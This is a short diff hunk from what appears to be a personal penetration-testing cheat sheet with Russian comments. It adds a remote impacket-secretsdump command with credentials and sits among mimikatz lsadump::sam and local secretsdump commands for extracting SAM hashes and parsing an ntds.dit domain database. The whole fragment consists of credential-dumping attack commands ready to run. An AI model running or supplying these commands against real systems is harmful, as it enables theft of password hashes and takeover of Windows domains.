@@ -29,6 +29,9 @@ kiwi_cmd lsadump::sam
 
 python secretsdump.py -sam sam -system system LOCAL 
 
+impacket-secretsdump hacker.local/user:password@ip_adress
+
+
 -----Распарсить NTDS.DIT
 
 impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text  
